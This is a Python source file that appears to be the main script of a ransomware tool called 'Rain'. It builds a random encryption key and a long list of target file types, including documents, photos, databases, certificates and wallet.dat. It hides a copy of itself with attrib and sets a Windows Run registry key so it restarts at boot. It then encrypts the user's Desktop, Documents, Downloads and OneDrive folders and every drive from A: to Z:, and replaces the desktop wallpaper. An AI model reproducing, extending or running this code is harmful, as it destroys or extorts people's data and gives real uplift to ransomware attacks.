from Crypter import Crypt
from Crypto.Random import new
from os import getenv, chdir, system
from os.path import expanduser
from string import ascii_uppercase
from shutil import copyfile

""" ABOUT VARIABLES TO BE DECLARED

    exts : file extensions to encrypt
    img : image to be placed on the user's desktop
    passwd : random key for encryption
    crypto : created instance of the Crypt class
    desktop : path to the user's desktop (if there is)
    documents : path to the user documents (if there is)
    downloads : path to the user downloads (if there is)
    onedrive : path to the user onedrive (if there is)
    appdata : path to the user's AppData
"""

exts = ['*.php',
        '*.md',
        '*.pl',
        '*.7z',
        '*.rar',
        '*.m4a',
        '*.wma',
        '*.avi',
        '*.wmv',
        '*.csv',
        '*.d3dbsp',
        '*.sc2save',
        '*.sie',
        '*.sum',
        '*.ibank',
        '*.t13',
        '*.t12',
        '*.qdf',
        '*.gdb',
        '*.tax',
        '*.pkpass',
        '*.bc6',
        '*.bc7',
        '*.bkp',
        '*.qic',
        '*.bkf',
        '*.sidn',
        '*.sidd',
        '*.mddata',
        '*.itl',
        '*.itdb',
        '*.icxs',
        '*.hvpl',
        '*.hplg',
        '*.hkdb',
        '*.mdbackup',
        '*.syncdb',
        '*.gho',
        '*.cas',
        '*.svg',
        '*.map',
        '*.wmo',
        '*.itm',
        '*.sb',
        '*.fos',
        '*.mcgame',
        '*.vdf',
        '*.ztmp',
        '*.sis',
        '*.sid',
        '*.ncf',
        '*.menu',
        '*.layout',
        '*.dmp',
        '*.blob',
        '*.esm',
        '*.001',
        '*.vtf',
        '*.dazip',
        '*.fpk',
        '*.mlx',
        '*.kf',
        '*.iwd',
        '*.vpk',
        '*.tor',
        '*.psk',
        '*.rim',
        '*.w3x',
        '*.fsh',
        '*.ntl',
        '*.arch00',
        '*.lvl',
        '*.snx',
        '*.cfr',
        '*.ff',
        '*.vpp_pc',
        '*.lrf',
        '*.m2',
        '*.mcmeta',
        '*.vfs0',
        '*.mpqge',
        '*.kdb',
        '*.db0',
        '*.mp3',
        '*.upx',
        '*.rofl',
        '*.hkx',
        '*.bar',
        '*.upk',
        '*.das',
        '*.iwi',
        '*.litemod',
        '*.asset',
        '*.forge',
        '*.ltx',
        '*.bsa',
        '*.apk',
        '*.re4',
        '*.sav',
        '*.lbf',
        '*.slm',
        '*.bik',
        '*.epk',
        '*.rgss3a',
        '*.pak',
        '*.big',
        '*.unity3d',
        '*.wotreplay',
        '*.xxx',
        '*.desc',
        '*.py',
        '*.m3u',
        '*.flv',
        '*.js',
        '*.css',
        '*.rb',
        '*.png',
        '*.jpeg',
        '*.p7c',
        '*.p7b',
        '*.p12',
        '*.pfx',
        '*.pem',
        '*.crt',
        '*.cer',
        '*.der',
        '*.x3f',
        '*.srw',
        '*.pef',
        '*.ptx',
        '*.r3d',
        '*.rw2',
        '*.rwl',
        '*.raw',
        '*.raf',
        '*.orf',
        '*.nrw',
        '*.mrwref',
        '*.mef',
        '*.erf',
        '*.kdc',
        '*.dcr',
        '*.cr2',
        '*.crw',
        '*.bay',
        '*.sr2',
        '*.srf',
        '*.arw',
        '*.3fr',
        '*.dng',
        '*.jpeg',
        '*.jpg',
        '*.cdr',
        '*.indd',
        '*.ai',
        '*.eps',
        '*.pdf',
        '*.pdd',
        '*.psd',
        '*.dbfv',
        '*.mdf',
        '*.wb2',
        '*.rtf',
        '*.wpd',
        '*.dxg',
        '*.xf',
        '*.dwg',
        '*.pst',
        '*.accdb',
        '*.mdb',
        '*.pptm',
        '*.pptx',
        '*.ppt',
        '*.xlk',
        '*.xlsb',
        '*.xlsm',
        '*.xlsx',
        '*.xls',
        '*.wps',
        '*.docm',
        '*.docx',
        '*.doc',
        '*.odb',
        '*.odc',
        '*.odm',
        '*.odp',
        '*.ods',
        '*.odt',
        '*.sql',
        '*.zip',
        '*.tar',
        '*.tar.gz',
        '*.tgz',
        '*.biz',
        '*.ocx',
        '*.html',
        '*.htm',
        '*.3gp',
        '*.srt',
        '*.cpp',
        '*.mid',
        '*.mkv',
        '*.mov',
        '*.asf',
        '*.mpeg',
        '*.vob',
        '*.mpg',
        '*.fla',
        '*.swf',
        '*.wav',
        '*.qcow2',
        '*.vdi',
        '*.vmdk',
        '*.vmx',
        '*.gpg',
        '*.aes',
        '*.ARC',
        '*.PAQ',
        '*.tar.bz2',
        '*.tbk',
        '*.bak',
        '*.djv',
        '*.djvu',
        '*.bmp',
        '*.cgm',
        '*.tif',
        '*.tiff',
        '*.NEF',
        '*.cmd',
        '*.class',
        '*.jar',
        '*.java',
        '*.asp',
        '*.brd',
        '*.sch',
        '*.dch',
        '*.dip',
        '*.vbs',
        '*.asm',
        '*.pas',
        '*.ldf',
        '*.ibd',
        '*.MYI',
        '*.MYD',
        '*.frm',
        '*.dbf',
        '*.SQLITEDB',
        '*.SQLITE3',
        '*.asc',
        '*.lay6',
        '*.lay',
        '*.ms11 (Security copy)',
        '*.sldm',
        '*.sldx',
        '*.ppsm',
        '*.ppsx',
        '*.ppam',
        '*.docb',
        '*.mml',
        '*.sxm',
        '*.otg',
        '*.slk',
        '*.xlw',
        '*.xlt',
        '*.xlm',
        '*.xlc',
        '*.dif',
        '*.stc',
        '*.sxc',
        '*.ots',
        '*.ods',
        '*.hwp',
        '*.dotm',
        '*.dotx',
        '*.docm',
        '*.DOT',
        '*.max',
        '*.xml',
        '*.uot',
        '*.stw',
        '*.sxw',
        '*.ott',
        '*.csr',
        '*.key',
        'wallet.dat',
        '*.veg',
        '*.application',
        '*.lnk',
        '*.bitmap',
        '*.gif',
        '*.chc',
        '*.ogg',
        '*.json',
        '*.real',
        '*.xz',
        '*.nrg',
        '*.xvf',
        '*.xvfz',
        '*.tmp',
        '*.sublime-package',
        '*.img',
        '*.bg2',
        '*.qxd',
        '*.new',
        '*.ico',
        '*.pps',
        '*.pic',
        '*.iso',
        '*.rm',
        '*.dxf',
        '*.so',
        '*.appref-ms',
        '*.desktop',
        '*.list']

passwd = new().read(32)
img = 'Util/rain.jpg'
drives = []

for letter in list(ascii_uppercase):
    letter = letter + ':'
    drives.append(letter)

# Instantiate the Crypt class

crypto = Crypt(passwd, exts, img)

desktop = expanduser('~/Desktop')
documents = expanduser('~/Documents')
downloads = expanduser('~/Downloads')
onedrive = expanduser('~/OneDrive')
appdata = getenv('APPDATA')

""" Save the main file to the users public folder, 
    hide it through the prompt command "attrib" 
    and add a registry to run with system boot
"""

try:
    dst = r'C:\Users\Public\{}'.format(__file__)
    copyfile(__file__, dst)
    system('attrib +s +h {}'.format(dst))
except PermissionError:
    try:
        dst = r'C:\{}'.format(__file__)
        copyfile(__file__, dst)
        system('attrib +s +h {}'.format(dst))
    except PermissionError:
        dst = __file__
        system('attrib +s +h {}'.format(dst))

crypto.registry_key(r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', '"' + dst + '"', 'Rain')

# Encrypt user's desktop, documents, downloads, onedrive and change the desktop background

crypto.crypt_directory(desktop)
crypto.crypt_directory(documents)
crypto.crypt_directory(downloads)
crypto.crypt_directory(onedrive)

crypto.change_background(appdata)

""" This structure is for encrypting each storage device connected to the machine 
    (USB sticks, external hard drives and hard drives (external or not) )
"""

for drive in drives:
    try:
        chdir(drive + '/')
        crypto.crypt_directory(drive)
    except FileNotFoundError:
        continue
    except PermissionError:
        continue
